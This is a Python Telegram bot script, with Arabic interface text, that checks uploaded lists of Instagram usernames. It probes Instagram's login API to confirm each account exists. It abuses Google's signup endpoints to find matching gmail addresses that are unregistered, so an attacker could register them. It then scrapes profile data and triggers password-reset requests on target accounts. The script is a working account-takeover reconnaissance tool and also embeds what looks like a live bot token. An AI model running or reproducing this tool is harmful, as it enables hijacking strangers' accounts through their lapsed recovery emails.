from requests import get,post
import os
from random import choice,randrange
import http.client
import requests
import re
from time import sleep,time
from user_agent import generate_user_agent
from random import choice,randrange
import os,re
import requests 
try:
	import telebot 
except:
	os.system('pip install telebot')
	os.system('pip install Pytelegrambotapi==3.7.7')
	os.system('clear')
	import telebot	
from telebot import types
import requests
from uuid import uuid4
import random
from re import *
import json
from user_agent import generate_user_agent
import sys
from datetime import datetime
from bs4 import BeautifulSoup
import datetime
import secrets
try:
	import mechanize
except:
	os.system('pip install mechanize')
	os.system('clear')
	import mechanize
	
cokie  = secrets.token_hex(8)*2
zzk=0

tok=input("7916824366:AAF27FerQ0raPQ3VoPRtxQ_FUhWrdEOeELc")
	
print('\n')
print('روح للبوت دز start/')
bot = telebot.TeleBot(tok)
zxu = datetime.datetime.now()
@bot.message_handler(commands=['start'])
def start(message):
 global zzk
 zzk+=1
 nm = message.from_user.first_name
 id2 = message.from_user.id
 userk = message.from_user.username
 zxu = datetime.datetime.now()
 tt=f'''
عضو يستخدم البوت…
ـــــــــــــــــــــــــــــــــــــــ
اسم المستخدم : {nm}
يوزر المستخدم : @{userk}
ايدي المستخدم : {id2}
رقم المستخدم  : {zzk}
الوقت : {zxu}
ـــــــــــــــــــــــــــــــــــــــ
ـ @P_W_7'''

 key = types.InlineKeyboardMarkup()
 bot.send_message(message.chat.id, f"<strong>{tt}</strong>",parse_mode="html",reply_markup=key)
 

 
 ch = types.InlineKeyboardButton(text ="أبـدأ فحـص لـسته انسـتا ", callback_data = 'list')
 kk = types.InlineKeyboardButton(text =" حـذف الـسته القـديمه ", callback_data = 'ttl')
 az = types.InlineKeyboardButton(text ="المبرمج : @P_W_7", url = 'https://t.me/P_W_7')
 fr = message.from_user.first_name
 maac = types.InlineKeyboardMarkup()
 maac.row_width=2
 maac.add(ch,kk,az,)
 bot.send_message(message.chat.id,f"<strong>اهلا بك : | {fr} | في بـوت فـحص  لـسته  انسـتكرام للحصول على معلوماتك [ /info ]</strong>",parse_mode="html",reply_markup=maac)
@bot.callback_query_handler(func=lambda call:True)
def st(call):
 
 
 if call.data== 'list':
            nc1 = types.InlineKeyboardMarkup(row_width=2)
            message= bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text='أرسـل لسـته انستكرام لـيتم الفحص ',reply_markup=nc1)
            bot.register_next_step_handler(message,k1,message.id)


 elif call.data== 'ttl':
  nc1 = types.InlineKeyboardMarkup(row_width=2)
  MC = bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text='أرسـل كـلمه حـذف ',reply_markup=nc1)
  bot.register_next_step_handler(MC,k2)

def qredes():
    ua=str(generate_user_agent())
    time0=time()
    conn = http.client.HTTPSConnection('accounts.google.com')
    while True:
        try:
            headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'referer': 'https://accounts.google.com/',
    'user-agent': ua,
}
            conn.request(
    'GET',
    '/lifecycle/flows/signup?biz=false&flowEntry=SignUp&flowName=GlifWebSignIn&followup=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&osid=1&service=mail',
    headers=headers
)
            response = conn.getresponse().info()
            __Host_GAPS=str(response).split('Set-Cookie: __Host-GAPS=')[1].split(';')[0]
            tl=str(response).split('TL=')[1].split('\n')[0]
            break
        except:''
    while True:
        try:
            cookies = {
    '__Host-GAPS': __Host_GAPS,
}
            headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'referer': 'https://accounts.google.com/',
    'user-agent':  ua,
}
            response = requests.get(
    'https://accounts.google.com/lifecycle/steps/signup/name?emr=1&flowEntry=SignUp&flowName=GlifWebSignIn&followup=https://mail.google.com/mail/u/0/&osid=1&service=mail&TL='+tl,
    cookies=cookies,
    headers=headers,
)
            tok=re.findall(r'"(.*?)"',str(response.text).split('<!doctype html')[1].split('/lifecycle/_/AccountLifecyclePlatformSignupUi/')[0])
            hl=tok[0]
            s1=tok[28]
            at=tok[33]
            break
        except:''
    while True:
        try:
            name=''.join(choice('azertyuiopmlkjhgfdsqwxcvbn') for i in range(randrange(4,13)))
            cookies = {
    '__Host-GAPS': __Host_GAPS,
}
            headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
    'origin': 'https://accounts.google.com',
    'referer': 'https://accounts.google.com/',
    'user-agent': ua,
    'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
    'x-goog-ext-391502476-jspb': '["'+s1+'","mail"]',
    'x-same-domain': '1',
}
            params = {
    'rpcids': 'E815hb',
    'source-path': '/lifecycle/steps/signup/name',
    'hl': hl,
    'TL': tl,
}
            data = 'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22'+name+'%5C%22%2C%5C%22%5C%22%2C0%2C%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2C0%2C1%2C%5C%22%5C%22%2Cnull%2Cnull%2C2%2C2%5D%2Cnull%2C%5B%5D%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2C%5C%22mail%5C%22%5D%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at='+at+'&'
            response = requests.post(
    'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
)
            break
        except:''
    while True:
        try:
            yaer=str(randrange(1980,2007))
            month=str(randrange(1,12))
            day=str(randrange(1,28))
            cookies = {
    '__Host-GAPS': __Host_GAPS
}
            headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
    'origin': 'https://accounts.google.com',
    'referer': 'https://accounts.google.com/',
    'user-agent': ua,
    'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
    'x-goog-ext-391502476-jspb': '["'+s1+'","mail"]',
    'x-same-domain': '1',
}
            params = {
    'rpcids': 'eOY7Bb',
    'source-path': '/lifecycle/steps/signup/birthdaygender',
    'hl': hl,
    'TL': tl,
}

            data = 'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B'+yaer+'%2C'+month+'%2C'+day+'%5D%2C1%2Cnull%2C0%2C%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2C0%2C1%2C%5C%22%5C%22%2Cnull%2Cnull%2C2%2C2%5D%2C%5C%22%3CiUVqRR0CAAZTFvCGcxaNEqaeSioWmer0ADQBEArZ1AbW8EaBzfF11OToJc8rVRf567WhHSsHVMS0KPTiaZwr5pRNxLkK9RFieh5kZPBxzQAAAfCdAAAACKcBB7EAR5bLmW4_pyTl0q5GLHZl4BUTtf5jKTDjvxJk-VC9uNwzsTszdq9QTwfQ0_DHYWRUQ5D-0Q7wlf8WYIT1MtRwAzJlzeQGANesVgivzo24pJLwbK5u09y-72TKV70_6M1xVh6LwwBKoiUNY7W10Ng--cONycFdiuW5-9A6YPDsVqeQjqoACYUa5myX0nOSoLdgirK3Dee6DPRA24QuCxHZdbPJw9ftTchvQHfPacZ2qTX75RGo2yPbKidai5QfBmaQnPDEpAO6vPu0OkTykd1WQUEQQMhO8uLWnPtqnEzJRwVYHYo8JSRIdx3227TV7CmTonE1PHiZPyPb8zB0LHwFrgAhjTUS2edAfguaYgQQS5A1tWvNaGEoeBxrc-B0q_cPQkfrJbCBsCVe6nTN3SZx2QrDfKuc9Z8vOg7OCCkIv98DFRBbJr0WJueIAuIWpCqXyIOpsMyVWHVcgoGiQWLGYzigfAmY47zxxt0CPKslU2gVH5ZzCnEAtfzlG5oG50mS94lg9QEWfIeQkghJ8KXp8SUUnu3mVLKATFn_Ju9AKekgoHGu4gjDfzxzM4MStJojZS98bAVPhagqvp-UCIpAu4Ym7egIqFexR_YNTmxXPbpNHPFYv6FN9k2RDS1WLYxT4N7TzgtWJGc-GF9YZbGzpaeTjbO2_-0GSPX9tmael40o0E-ocd6OxEISENG_ZQTMWxWZzPdYNXxJOD5yAUpbZJR_0WBRk_bA5-PXX6hpA7TvwclDq77YLxWTeVKVmrYDPTPfVc3uAUOrMPV2J565-m9UJ1zqrXALM0fwdfyQPEN4K9hrn9l5U6UJMK18_C349ioqL5kz_yeyj1fKtnDqNlQjkD-xrAfEDqiDAfYhjaFRn9mdymFELdQSWhHCD8ItfapoezIH8OB_wYUKnJiJ76yiweU3h4AV1RxNKDEcIsRVixEyLwSRrl-UsP-MSM8LflbsVQbuiwLQLEbJLFMSlolNVvrlWWgOaWMyhVz6yay4dgiaUustS2xqooWiKyeVMlyDFrwQ092qxBkmsKLqgtVOVInzdW6gNiA79rxALtZXsrlSG1xnSbwwiGpxU7qLqUMqb5taN6_RCnzS7gRztKjP_Nxcm2VZe9e-UsIbaFXduTbvYrfELi_21Cwr3mgYvu5nOwK-_lpFPcRAn35xw5K15hZpyAZ0DHJVvWb2MjDNNJiQC9JEexsN4QHBnNRWi4JazEmrhoBPRVcQ970qOY5ayuAFAWbV3P1QUmi5KRHzYVvPBXDyYUK4-Txd5RYKgg1DUxlWAQUXHQJ3pHwLPVwN3QxGM5BWcW2716AhrcPWzn7YvLrYJ1oauQSMKtJw9bNLhnVibIRVJ2epZnPQN3jg3bEqMn5NHj50cUFpF9qe1VlmHd0x7eQsXkGIVUYh5d-mwkOuZ_B-zSW0ifIq5Bf1mXKF9JgyAW8dhETFqXH-a_gjiyAS2BEefo-i3TwaeuAwyh4F6aP-nh168NrICOLZQ92jk3xkk7gYjF_bvxsYwPyz1YRL2n7N1PQAHRdCkqAcjaJ90ieUUNTPwtiFqIhglzrf3GGMHpggdViRoeAzPMlO-ENtQhPqWwWfqnVMkHSLxlU-cfLVPap97ZBQNlNY4_D9zu722n-eOPRrXo53yyx-OXpb3qqFb7y7UR4cYCmXxj0FWTl-RWpnUyxLUwicH2MnhsDaJWBA54fRvNI4nOY8f5VyVBXfaXgLQwJqNrRGcFtLO8Lg1xvHIKDTV_zrz9D168CndnByIESfYOC0OkLt-WBmYbTmNiiHwS7dg8pHngFY389zqAq5ytk4HcyhOtmUgpx2YVIYuVpKh7p78Z8SdBVMyvztqXliq7uwtR8-FJcb0C-CEdDCmdDNB3Hpzkf-1WQGIAqNJjrUz9h6VWJYxmTgc_XPm2s-yk77e5fa9OJ4xjOHeseNtGYhen6gWmNMbh60fl9eemdfE0Fkgp3Hs7MsPkciPLfSFR_xsW8nIVaQEZJSISY-dC0klZTNK2SpWolbZ854i1ErGQCc_3HBh0hIlsPJrqcoPDlmhHs-1Iqtr18aJyfNU_7Iq-IqE9sy0dLVRowqFqFSnDKcv2BjvBF0atL2e6HcXhIQtMZlUKVUl8-GlyO1wqPZrwBY6Y-VWSie93XEcz5oUunkDkTM9P9ZTiLQKQdknPD7Xtis-nkyGya1UtnF-IChRpMnBfaW9V790HZFYD6PKJ15nVIKj42gibtzuK7ssA-3WJwSwA0fKpeT_73UPoa6HE4oE7bhcjzo9ksAOAp99PAuHnJh0J4rIiCeEU7tSbFK2Pw67VuGjI4N9X0j7k0GLzeI688KPB2DGurMp-LvC2IG9CtMQ640NEqeL0E1TxIxx96o0Ei7CyL4Q2QG_FacW0ARHSWSxiR0csbEfl4df9woMkq2kS3MNGmw4kqr0traabbonvPGzXCpuoOSIPwSAbmSPycOrOITw8TgIN5VRiAqm6_SiCsSrukPXsJNk7qRfa4jLW72QUxT7qQILT3G3SPVLYotsWTmpSesKuwYooo4s5Sb4cIXDDDVB4GKYuDmPvSaaa-QLfXeQgzxHLcI_dLHTGn7wWI8zdbghSkdQUIWw3jZvg0uFHjut66bQOSPGeZMP7XWOZtZRdDgesg8pQ9R-5_yAhQc67C1CryDKkJk5CP-f8Qky3afIppWOH_oPYaLFzW5Da_be-b3jc4qVxlr3_QYH9xQh0JY4Ov1OwFW8BVLCxuILcmtcxo3Gdlx6j-E73w570E6P_kvuoxx8cYzz5XYamgXz616GpYv6W428iFKuWJea29by1EczNDyuZaWBPc0K0j4XU83JYN0qI-yapNGwUj9xg9D5_xrtQRLruSyEjym8_k_kdUNoN4-y_FzIeygIvPEx3sUioZcpSNDzDbI_dmCFFtHzRxlNVRJ4ztU3vHyO3nAPXt2PrvbJ9e82zeqcYv3z5nbKwr8utji-szOrqg4gKCGm4LVSlgKyWz2C8ZmkTy5VYWBbScWuYTwxb_6GXZW4pcDJIVbtjALx9xDHj4LTHv52ufuhThsXq60u2RQmXaR%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5C%22mail%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at='+at+'&'
            response = requests.post(
    'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
)
            break
        except:''
    tm=time()-time0
    try:
        return {
            'tokens':{
                '__Host-GAPS':__Host_GAPS,
                'TL':tl,
                'hl':hl,
                'at':at,
                's1':s1,
            },
            'info':{
                'name':name,
                'birthday':{
                    'day:month:year':day+':'+month+':'+yaer,
                    'day':day,
                    'month':month,
                    'year':yaer,
                },
                'time_get_tokens':tm,
                'time':time(),
                'by':'@Qredes - https://t.me/Qredes_Tools'
                    },
            'errors':[],
        }
    except:
        return {
            'errors':['error get tokens'],
            'tokens':{

            },
            'info':{
                'by':'@Qredes - https://t.me/Qredes_Tools',
                'time':time(),
                'time_get_tokens':tm,
            },
        }


def get_tokens():
  while True:
    try:
      g=qredes()['tokens']
      TL=g['TL']
      __Host_GAPS=g['__Host-GAPS']
      at=g['at']
      hl=g['hl']
      s1=g['s1']
      try:
        os.remove(f'tokens.txt')
      except:''
      with open(f'tokens.txt','a') as a:
        a.write(f'{TL}///{__Host_GAPS}///{at}///{hl}///{s1}')
      return 
    except:''


def check_tokens():
  while True:
    try:
      try:
        o=open('tokens.txt','r').read().splitlines()[0].split('///')
        TL=o[0]
        __Host_GAPS=o[1]
        at=o[2]
        hl=o[3]
        s1=o[4]
      except Exception as e:
        get_tokens()
        return
      email=''.join(choice('azertyuiopmlkjhgfdsqwxcvbn1234567890.') for i in range(randrange(10,15)))
      cookies = {
          '__Host-GAPS': __Host_GAPS,
      }

      headers = {
          'accept': '*/*',
          'accept-language': 'en-US,en;q=0.9',
          'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
          'origin': 'https://accounts.google.com',
          'priority': 'u=1, i',
          'referer': 'https://accounts.google.com/',
          'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
          'sec-ch-ua-arch': '"x86"',
          'sec-ch-ua-bitness': '"64"',
          'sec-ch-ua-form-factors': '"Desktop"',
          'sec-ch-ua-full-version': '"112.0.5197.39"',
          'sec-ch-ua-full-version-list': '"Not/A)Brand";v="8.0.0.0", "Chromium";v="126.0.6478.183", "Opera";v="112.0.5197.39"',
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-model': '""',
          'sec-ch-ua-platform': '"Windows"',
          'sec-ch-ua-platform-version': '"10.0.0"',
          'sec-ch-ua-wow64': '?0',
          'sec-fetch-dest': 'empty',
          'sec-fetch-mode': 'cors',
          'sec-fetch-site': 'same-origin',
          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
          'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
          'x-goog-ext-391502476-jspb': '["{}"]'.format(s1),
          'x-same-domain': '1',
      }

      params = {
          'rpcids': 'NHJMOd',
          'source-path': '/lifecycle/steps/signup/username',
          'f.sid': '-794764349027196993',
          'bl': 'boq_identity-account-creation-evolution-ui_20240731.08_p0',
          'hl': hl,
          'TL': TL,
          '_reqid': '648808',
          'rt': 'c',
      }

      data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C8420%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(email,at)

      response = post(
          'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
          params=params,
          cookies=cookies,
          headers=headers,
          data=data,
      ).text
      if 'password' in response:
        return
      else:
        get_tokens()
        return
    except:''
def k1(message,id):
	iid = str(message.from_user.id)
	aol1=0
	face1=0
	face2=0
	aol2=0
	eerr=0
	zzoy=0
	addad=0
	try:
		filename = message.document.file_name
		file_info = bot.get_file(message.document.file_id)
		use = bot.download_file(file_info.file_path)		
		with open(f'userzaidtool{iid}.txt', 'wb') as (zaidno):
			zaidno.write(use)
	except:
		key = types.InlineKeyboardMarkup()
		bot.send_message(message.chat.id, f"<strong>هنـاك خـطأ فـي الـملف</strong>",parse_mode="html",reply_markup=key)
	try:
		file = open(f'userzaidtool{iid}.txt','r').read().splitlines()
		addd = len(open(f"userzaidtool{iid}.txt").read().splitlines())
	except FileNotFoundError as error:
		key = types.InlineKeyboardMarkup()
		bot.send_message(message.chat.id, f"<strong>هنـاك خطـأ او مشـكله مـا </strong>",parse_mode="html",reply_markup=key)
	for zood in file:
			addad+=1
			zzoy+=1
			try:
				email = (zood).split('@')[0]+'@gmail.com'
			except:
				email = (zood)+'@gmail.com'
				eerr+=1				

			try:
			         url = 'https://b.i.instagram.com/api/v1/accounts/login/'
			         headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',
                 'Cookie':'missing',
                 'Accept-Encoding':'gzip, deflate',
                 'Accept-Language':'en-US',
                 'X-IG-Capabilities':'3brTvw==',
                 'X-IG-Connection-Type':'WIFI',
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
              'Host':'i.instagram.com'}
						
			         uid = str(uuid4())
			         data = {
'uuid':uid, 
'password':'ffffdddddaaa666', 
'username':email,
'device_id':uid, 
'from_reg':'false', 
'_csrftoken':'missing', 
'login_attempt_countn':'0'
			}
			
			         try:
			         	re = requests.post(url,headers=headers,data=data).text
			         except:
			         	eerr+=1
			         if ('"The username you entered ') in re:
			         	face2+=1
			         elif ('"bad_password"') in re:
			         	face1+=1
			         	email=email.split('@')[0]+'@gmail.com'
			         	try:
			         		      if '@' in email:email=email.split('@')[0]
			         		      check_tokens()
			         		      o=open('tokens.txt','r').read().splitlines()[0].split('///')
			         		      TL=o[0]
			         		      __Host_GAPS=o[1]
			         		      at=o[2]
			         		      hl=o[3]
			         		      s1=o[4]
			         		      cookies = {
          '__Host-GAPS': __Host_GAPS,
      }

			         		      headers = {
          'accept': '*/*',
          'accept-language': 'en-US,en;q=0.9',
          'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
          'origin': 'https://accounts.google.com',
          'priority': 'u=1, i',
          'referer': 'https://accounts.google.com/',
          'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
          'sec-ch-ua-arch': '"x86"',
          'sec-ch-ua-bitness': '"64"',
          'sec-ch-ua-form-factors': '"Desktop"',
          'sec-ch-ua-full-version': '"112.0.5197.39"',
          'sec-ch-ua-full-version-list': '"Not/A)Brand";v="8.0.0.0", "Chromium";v="126.0.6478.183", "Opera";v="112.0.5197.39"',
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-model': '""',
          'sec-ch-ua-platform': '"Windows"',
          'sec-ch-ua-platform-version': '"10.0.0"',
          'sec-ch-ua-wow64': '?0',
          'sec-fetch-dest': 'empty',
          'sec-fetch-mode': 'cors',
          'sec-fetch-site': 'same-origin',
          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
          'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
          'x-goog-ext-391502476-jspb': '["{}"]'.format(s1),
          'x-same-domain': '1',
      }

			         		      params = {
          'rpcids': 'NHJMOd',
          'source-path': '/lifecycle/steps/signup/username',
          'f.sid': '-794764349027196993',
          'bl': 'boq_identity-account-creation-evolution-ui_20240731.08_p0',
          'hl': hl,
          'TL': TL,
          '_reqid': '648808',
          'rt': 'c',
      }

			         		      data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C8420%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(email,at)

			         		      response = post(
          'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
          params=params,
          cookies=cookies,
          headers=headers,
          data=data,
      ).text
			         		      if 'password' in response:
			         		      	aol1+=1
			         		      	try:
			         		      		email=email+'@gmail.com'
			         		      		user=email.split('@')[0]
			
			         		      		urlg = f'https://i.instagram.com/api/v1/users/web_profile_info/?username={user}'
			         		      		he = {
	'accept': '*/*',
	'accept-encoding': 'gzip, deflate, br',
	'accept-language': 'ar',
	'cookie': 'mid=YwxKOAABAAF8xQkXR4AGXYFuw6mH; ig did=F24F4904-C337-48E4-AB1B-16AF5D553AFD; ig nrcb=1; d pr=3; datr=CUsMY8Q04NPqGMvwze9WJVY2; shbid="4821 \05454664153777\0541693612516:01f74576c1 35f7872 fb7 3886ff7479191 f1 a2dbcd8ca945a5b5128653 ccba468ed1e0311": shbts="166207651 6\054546641 53777\0541693612 516:01f7ecb709528c535487eb41 5ab771 2a01 bac5b97db1 740800a0c3d687a730cbd7e00135"; csrftoken=V9 FEMGcZB dh2UlbzDvSAM6aRj MqxzXjc',
	'origin': 'https://www.instagram.com',
	'referer': 'https://www.instagram.com/',
	'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
	'sec-ch-ua-mobile': '?0',
	'#sec-ch-ua-platform': '"Windows"',
	'sec-fetch-dest': 'empty',
	'sec-fetch-mode': 'cors',
	'sec-fetch-site': 'same-site',
	'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
	'x-asbd-id': '198387',
	'x-csrftoken': 'V9FEMGcZBdh2U1lbzDvsAM6aRjMqxzXjc',
	'x-ig-app-id': '936619743392459',
	'x-ig-www-claim': '0',
	};re =requests.get(urlg, headers=he).json();io = re['data']['user']['biography'];fol = re['data']['user']['edge_followed_by']['count'];fos = re['data']['user']['edge_follow']['count'];ido = re['data']['user']['id'];nam = re['data']['user']['full_name'];isp = re['data']['user']['is_private'];op = re['data']['user']['edge_owner_to_timeline_media']['count']
			         		      		try:
			         		      			re = requests.get(f"https://o7aa.pythonanywhere.com/?id={ido}")
			         		      			ree = re.json()
			         		      			date = ree['date']
			         		      		except:
			         		      			date="Not Data"
			         		      		heeee = {
	'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
	'Host': 'i.instagram.com',
	'Connection': 'Keep-Alive',
	'User-Agent': generate_user_agent(),
	'Accept-Language': 'en-US',
	'X-IG-Connection-Type': 'WIFI',
	'X-IG-Capabilities': 'AQ==',
	'x-csrftoken': 'V9FEMGcZBdh2U1lbzDvsAM6aRjMqxzXjc',
	      };daaa = {
	'ig_sig_key_version': '4',
	"user_id":ido};urr = 'https://i.instagram.com/api/v1/accounts/send_password_reset/'
	
			         		      		try:
			         		      			reeee = requests.post(urr,headers=heeee,data=daaa).json()
			         		      			rest = reeee['obfuscated_email']
			         		      		except:
			         		      			rest='No Rest'
			         		      		ff =f'''
🎖═══════════════════
🗣 𝐍𝐀𝐌𝐄 ﴾ {nam} ﴿
🎫 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 ﴾ @{user} ﴿
🗞 𝐈𝐃 ﴾ {ido} ﴿
📧 𝐄𝐌𝐀𝐈𝐋 ﴾ {email} ﴿
🪆 𝐅𝐎𝐋𝐋𝐎𝐖𝐒 ﴾ {fol} ﴿
🎎 𝐅𝐎𝐋𝐋𝐎𝐖𝐆 ﴾ {fos} ﴿
📅 𝐃𝐀𝐓𝐄 ﴾ {date} ﴿
🖼 𝐏𝐎𝐒𝐓𝐒 ﴾ {op} ﴿
🔐 𝐈𝐒𝐏 ﴾ {isp} ﴿
🔭 𝐑𝐄𝐒𝐓 ﴾ {rest} ﴿
🔍 𝐏𝐈𝐎 ﴾ {io} ﴿
🎖═══════════════════
🤴 𝐁𝐘 ﴾ @P_W_7 ﴿'''
			         		      		key = types.InlineKeyboardMarkup();bot.send_message(message.chat.id, f"<strong>{ff}</strong>",parse_mode="html",reply_markup=key)
			         		      	except:
			         		      		ff=f'''
Not info In Instagram
Email : {email}
Dev: @P_W_7''';key = types.InlineKeyboardMarkup();bot.send_message(message.chat.id, f"<strong>{ff}</strong>",parse_mode="html",reply_markup=key)
			         		      else:
			         		      	aol2+=1
			         	except:
			         		eerr+=1	    
			         else:
			         	face2+=1
			except:
			         eerr+=1
			try:
				ba12=types.InlineKeyboardButton(f"Error Email : {eerr}",callback_data='b12')
				mees = types.InlineKeyboardMarkup(row_width=2)
				ba0=types.InlineKeyboardButton(f"Developer : @P_W_7",callback_data='b0')
				ba1=types.InlineKeyboardButton(f"Email : {email}",callback_data='b1')
				ba2=types.InlineKeyboardButton(f"God Insta  : {face1}",callback_data='b2')
				ba3=types.InlineKeyboardButton(f"God Gmail : {aol1}",callback_data='b3')
				ba5=types.InlineKeyboardButton(f"BaD gmail : {aol2}",callback_data='b5')
				ba6=types.InlineKeyboardButton(f"Bad Insta : {face2}",callback_data='b6')
				ba7=types.InlineKeyboardButton(f" Channel : W_7_Q",callback_data='b7')
				ba11=types.InlineKeyboardButton(f" List : {addd} | ok : {addad}",callback_data='b11')
				mees.add(ba0,ba7,ba2,ba3,ba5,ba6,ba11,ba12,ba1)
				bot.edit_message_text(chat_id=message.chat.id,message_id=id,text="بدأ صيـد مـتـاحـات انـستكرام حـضاً مـوفقاً",parse_mode='markdown',reply_markup=mees)
			except:
				pass
			try:
				if addd == addad:
					key = types.InlineKeyboardMarkup()
					bot.send_message(message.chat.id, f"<strong>لـقد انـتهى فـحص الـسته</strong>",parse_mode="html",reply_markup=key)
					os.system(f'rm -rf userzaidtool{id}.txt')
			except:
				pass

def k2(message):
	id = str(message.from_user.id)
	tn=str(message.text)
	if 'حذف' in tn:
		os.system(f'rm -rf userzaidtool{id}.txt')
		key = types.InlineKeyboardMarkup()
		bot.send_message(message.chat.id, f"<strong>تـم حـذف لسـتاتـك القـديمه</strong>",parse_mode="html",reply_markup=key)
	else:
		key = types.InlineKeyboardMarkup()
		bot.send_message(message.chat.id, f"<strong>لـقد أرسـلت الكـلمه بشـكل خطأ</strong>",parse_mode="html",reply_markup=key)

						
@bot.message_handler(commands=["info"])
def inf(message):
    global zzk
    zzk+=1
    zxu = datetime.datetime.now()
    nm = message.from_user.first_name
    id2 = message.from_user.id
    userk = message.from_user.username
    bio = bot.get_chat(message.from_user.id).bio
    
    ttg=f'''
رتبتك هي عضو 🥰 
ـــــــــــــــــــــــــــــــــــــــ
اسم المستخدم : {nm}
يوزر المستخدم : @{userk}
ايدي المستخدم : {id2}
رقم المستخدم  : {zzk}
الوقت : {zxu}
بايو المستخدم : {bio}
ـــــــــــــــــــــــــــــــــــــــ
ـ @P_W_7'''
    key = types.InlineKeyboardMarkup()
    bot.send_message(message.chat.id, f"<strong>{ttg}</strong>",parse_mode="html",reply_markup=key) 	


while True :
    try:
        bot.infinity_polling()
    except:
        print('Error')